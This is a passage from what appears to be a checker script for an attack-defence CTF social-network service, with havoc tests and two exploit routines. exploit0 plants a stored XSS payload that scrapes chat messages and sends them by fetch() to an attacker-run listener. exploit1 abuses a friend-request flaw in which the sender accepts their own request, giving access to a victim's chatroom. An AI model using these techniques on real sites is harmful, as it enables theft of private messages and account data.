    "Mozilla/5.0 (PlayStation 4 3.11) AppleWebKit/537.73 (KHTML, like Gecko)",
    "Mozilla/5.0 (PlayStation Vita 3.61) AppleWebKit/537.73 (KHTML, like Gecko) Silk/3.2",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; XBOX_ONE_ED) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
    "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586",
    "Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/601.6 (KHTML, like Gecko) NF/4.0.0.5.10 NintendoBrowser/5.1.0.13343",
    "Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US",
    "Mozilla/5.0 (Nintendo 3DS; U; ; en) Version/1.7412.EU",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+",
    "Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Version/4.0 Kindle/3.0 (screen 600x800; rotate)",
]


@checker.havoc(6)
async def havoc6(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                 logger: LoggerAdapter) -> None:
    client.headers["User-Agent"] = random.choice(userAgents)
    logger.debug(client.headers["User-Agent"])
    username = secrets.token_hex(32)
    password = secrets.token_hex(32)
    r = await client.post(f"{getUrl(task)}/register", json={"username": username, "password": password, "confirmPassword": password})
    assert_equals(r.status_code, 302)


@checker.havoc(7)
async def havoc7(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                    logger: LoggerAdapter) -> None:
    cookies, username = await register(task, client, secrets.token_hex(32), logger)
    partnerCookies, partner = await register(task, client, secrets.token_hex(32), logger)
    r = await client.post(f"{getUrl(task)}/friends/requests",
                          json={'userName': username, 'partner': partner, 'status': 'send'}, cookies=cookies)
    assert_equals(r.status_code, 200)
    assert_equals(r.text, "ok")
    r = await client.post(f"{getUrl(task)}/friends/requests",
                          json={'userName': username, 'partner': partner, 'status': 'cancel'}, cookies=cookies)
    assert_equals(r.status_code, 200)
    assert_equals(r.text, "ok")


@checker.havoc(8)
async def havoc8(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                    logger: LoggerAdapter) -> None:
    cookies, username = await register(task, client, secrets.token_hex(32), logger)
    partnerCookies, partner = await register(task, client, secrets.token_hex(32), logger)
    r = await client.post(f"{getUrl(task)}/friends/requests",
                          json={'userName': username, 'partner': partner, 'status': 'send'}, cookies=cookies)
    assert_equals(r.status_code, 200)
    assert_equals(r.text, "ok")
    r = await client.post(f"{getUrl(task)}/friends/requests",
                          json={'userName': username, 'partner': partner, 'status': 'reject'}, cookies=partnerCookies)
    assert_equals(r.status_code, 200)
    assert_equals(r.text, "ok")


exploitMessage = "<script>function getText(){{let text='';let messages = document.getElementsByClassName(" \
                 "'message');for(let i = 0; i < messages.length; i++){{text += messages[i].innerHTML;}}return text;" \
                 " }}fetch('http://{0}:6452/', {{method: 'POST', body:'username=' + getText(),headers: {{ " \
                 "'Content-Type': 'application/x-www-form-urlencoded', }},}}); </script>"


def server(logger):
    class ExploitServer(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write("<html><head><title>ASocialNetwork</title></head>".encode())

        def do_POST(self):
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            if not os.path.isfile("/checker/flag.txt"):
                os.mknod("/checker/flag.txt")
            with open("/checker/flag.txt", "wb") as exploit:
                exploit.write(post_data)

    webServer = HTTPServer((HOST, PORT), ExploitServer)
    webServer.serve_forever()


def getFlag():
    while True:
        if os.path.isfile("/checker/flag.txt") and os.access("/checker/flag.txt", os.R_OK):
            with open("/checker/flag.txt", "r") as flag:
                return flag.read()


@checker.exploit(0)
async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient,
                   logger: LoggerAdapter) -> Optional[str]:
    start = time.time()
    if not json.loads(task.attack_info).keys() >= {'username', 'recipient'}:
        return None
    if not os.getenv("ENOCHECKER_PUTFLAG_PASSWORD"):
        return None
    process = multiprocessing.Process(target=server, args=(logger,))
    process.start()
    password = secrets.token_hex(32)
    cookie, username = await register(task, client, password, logger)
    target = json.loads(task.attack_info)['username']
    payload = encode(exploitMessage.format(task.address), target, logger)
    r = await client.post(f"{getUrl(task)}/messages/", json={"recipient": target, "message": payload}, cookies=cookie)
    assert_equals(r.status_code, 200, "exploit failed")
    await retrieve(task, logger, json.loads(task.attack_info)['username'], 'password', json.loads(task.attack_info)['recipient'], start, client, True)
    flagText = getFlag()
    flag = searcher.search_flag(flagText)
    process.terminate()
    return flag


@checker.exploit(1)
async def exploit1(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient,
                   logger: LoggerAdapter) -> Optional[str]:
    password = secrets.token_hex(32)
    cookie, username = await register(task, client, password, logger)
    target = json.loads(task.attack_info)['username']
    r = await client.post(f"{getUrl(task)}/friends/requests",
                          json={'userName': username, 'partner': target, 'status': 'send'}, cookies=cookie)
    assert_equals(r.status_code, 200, "sending friend request failed")
    r = await client.post(f"{getUrl(task)}/friends/requests",
                          json={'userName': username, 'partner': target, 'status': 'accept'}, cookies=cookie)
    assert_equals(r.status_code, 200, "accepting friend request failed")
    r = await client.get(f"{getUrl(task)}/profile/{target}", cookies=cookie)
    if len(r.text.split('<h3>')) < 2:
        return
    roomName = r.text.split('<h3>')[1].split('</h3>')[0]
    roomUrl = hashlib.sha256(roomName.encode()).hexdigest()
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
    if flag := searcher.search_flag(r.text):
        return flag


if __name__ == "__main__":
    checker.run()
